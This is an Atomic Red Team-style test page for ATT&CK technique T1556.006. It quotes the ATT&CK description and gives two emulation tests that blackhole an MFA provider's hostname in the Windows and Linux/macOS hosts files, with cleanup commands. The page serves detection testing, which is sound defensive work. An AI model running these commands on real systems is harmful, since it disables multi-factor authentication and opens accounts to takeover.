# T1556.006 - Modify Authentication Process: Multi-Factor Authentication

## Description from ATT&CK

> Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.
> 
> Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)
> 
> For example, modifying the Windows hosts file (`C:\windows\system32\drivers\etc\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a "fail open" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) 
> 
> Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022)

[Source](https://attack.mitre.org/techniques/T1556/006)

### Atomic Test #1: Disable MFA by Blackholing Provider Domain via Windows hosts File

Emulates an adversary disabling multi-factor authentication by adding a null-route entry for an MFA provider's hostname to the Windows hosts file, so MFA challenge requests fail and authentication proceeds without a second factor. This is a documented ATT&CK example for T1556.006. Cleanup removes the entry. Requires administrative privileges.

**Supported Platforms:** Windows

**auto_generated_guid:** `9f5deb8d-f3cf-47df-899c-0de1958980c6`

#### Inputs

| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| mfa_domain | Hostname of the MFA provider to blackhole | string | api-xxxxxxxx.duosecurity.com|

#### Attack Commands: Run with `powershell`! Elevation Required (e.g. root or admin)

```powershell
Add-Content -Path "$env:windir\System32\drivers\etc\hosts" -Value "`n0.0.0.0 #{mfa_domain} # T1556.006"
Write-Host "Blackholed #{mfa_domain} in hosts file"
```

#### Cleanup Commands

```powershell
$hostsFile = "$env:windir\System32\drivers\etc\hosts"
(Get-Content $hostsFile) | Where-Object { $_ -notmatch 'T1556\.006' } | Set-Content $hostsFile
```
### Atomic Test #2: Disable MFA by Blackholing Provider Domain via /etc/hosts

Emulates an adversary disabling multi-factor authentication on Linux/macOS by adding a null-route entry for an MFA provider's hostname to /etc/hosts, so MFA challenge requests fail. Cleanup removes the entry. Requires root privileges.

**Supported Platforms:** Linux, macOS

**auto_generated_guid:** `71b2253d-eb83-49e5-b5f0-ee12f743788b`

#### Inputs

| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| mfa_domain | Hostname of the MFA provider to blackhole | string | api-xxxxxxxx.duosecurity.com|

#### Attack Commands: Run with `sh`! Elevation Required (e.g. root or admin)

```sh
echo "0.0.0.0 #{mfa_domain} # T1556.006" | sudo tee -a /etc/hosts
```

#### Cleanup Commands

```sh
sudo cp /etc/hosts /etc/hosts.t1556006.bak && grep -v 'T1556.006' /etc/hosts.t1556006.bak | sudo tee /etc/hosts >/dev/null && sudo rm -f /etc/hosts.t1556006.bak
```
